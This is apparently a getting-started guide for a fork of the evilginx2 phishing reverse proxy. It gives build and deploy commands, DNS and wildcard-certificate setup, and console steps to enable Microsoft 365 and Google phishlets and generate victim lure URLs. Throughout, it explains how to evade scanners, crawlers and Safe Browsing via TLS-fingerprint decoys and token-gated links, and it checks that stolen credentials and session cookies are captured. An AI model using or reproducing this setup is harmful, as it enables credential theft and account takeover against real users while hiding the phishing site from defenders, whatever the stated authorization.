---
layout: default
title: Getting started
---

# Getting started

Shortest path from a clean VPS to a working phishing node. This guide assumes an
internet-facing Ubuntu VPS, a domain on Cloudflare, and an authorized engagement.

> 🔒 **OPSEC**: real hostnames, IPs and lure URLs belong in internal docs only — never in
> this repository. Everything below uses placeholders: `<BASE>.<ZONE>` for the base domain,
> `<VPS_IP>` for the node.

---

## 1. Build

Requirements: Go 1.21+ (the fork uses pure-Go SQLite, no CGO).

```bash
git clone https://github.com/dn9uy3n/fake-evilginx-pro.git
cd fake-evilginx-pro
cd src && go build -o ../evilginx2 . && cd ..
```

## 2. DNS (Cloudflare)

The node uses one base domain with a wildcard A record (DNS-only) plus a bare record:

| Record | Type | Content | Proxy |
|---|---|---|---|
| `<BASE>.<ZONE>` | A | `<VPS_IP>` | DNS only |
| `*.<BASE>.<ZONE>` | A | `<VPS_IP>` | DNS only |

**Rules learned in the field**

- The bare record and the wildcard are **both required**: `*.base` does *not* match `base`
  itself (RFC-style wildcard semantics), and evilginx builds lure URLs on both.
- Keep records **DNS-only (grey cloud)** — the Cloudflare proxy breaks the MITM TLS and the
  client IP seen by evilginx becomes Cloudflare's.
- After any DNS change, verify the bare host *and* a wildcard subdomain resolve before
  testing; recursive resolvers cache negative answers for up to the SOA minimum TTL.

## 3. Wildcard certificate (DNS-01, no CT-log noise per host)

```bash
cd deploy
ZONE=<ZONE> VPS_IP=<VPS_IP> ./wildcard-cert-setup.sh
```

This issues a Let's Encrypt wildcard cert for `*.<BASE>.<ZONE>` via DNS-01 and installs it
into the node cert directory. The auto-CA (`hotreload` gate) handles the rest.

## 4. Deploy + systemd

```bash
# ship the binary, phishlets and service unit to the node
deploy/deploy.sh <user>@<VPS_IP>
```

Two services run on the node:

| Unit | Purpose |
|---|---|
| `evilginx2.service` | the reverse proxy itself, listening `:443` (web) and `:9443` (mTLS API) |
| `bgrelay.service` | (Google phishlet only) the real-browser relay sidecar on `:9445` — see [google-relay](google-relay.md) |

Recommended production flags (see `deploy/templates/`):

```
-phishlet ms365 -phishlet google -api 9443 \
-botguard -bg-ja4 t13d15,<corporate-proxy-prefix> -bg-trusted 127.0.0.1/32,<VPS_IP>/32
```

- `-botguard` + `-bg-ja4`: serve a benign decoy to non-allowlisted TLS fingerprints
  (curl, python-requests, scanners). **This is why raw `curl` gets a 141-byte "It works!"
  page — that is the anti-bot working, not a fault.** The trusted CIDRs let the node
  self-test bypass it.
- Do **not** run `-jsobf ultra` — field-verified to break Microsoft's login JS.

## 5. First lure

1. Put your campaign phishlet YAML into `phishlets/` on the node (files are gitignored by
   design — they never ship with the repo).
2. Operate via the console from your workstation: [operations guide](operations.md).

```bash
cd tools
python egconsole.py
# inside the console:
#   phishlets            → list + status
#   enable ms365         → hot-enable, no restart
#   lure-create ms365 https://www.office.com
#   lureurl ms365 8      → generate the campaign URL (host + path)
```

Send the victim the token-gated URL: `https://<host>/<path>?t=<token>`. Crawlers and link
previewers that omit the token get a 302 to a benign redirect — Safe Browsing never sees a
login page to classify.

## 6. Google phishlet extra steps

The Google phishlet needs the relay sidecar (botguard is origin-bound — classic MITM
cannot work). Deploy `tools/relay/{bgrelay.py,page.html}` per the
[relay guide](google-relay.md), then create a relay lure (`relay: true`).

## 7. Verify before the campaign

- [ ] Bare and wildcard hosts both resolve (from an external resolver)
- [ ] `curl` (no UA) → 141-byte decoy = botguard alive
- [ ] Trusted-loopback render of the lure shows the real login flow
- [ ] Token-gate: lure without `?t=` redirects to the benign URL
- [ ] Test account end-to-end: credentials + cookies land in the session store
- [ ] Chrome Safe Browsing check on a burner domain, not the campaign one
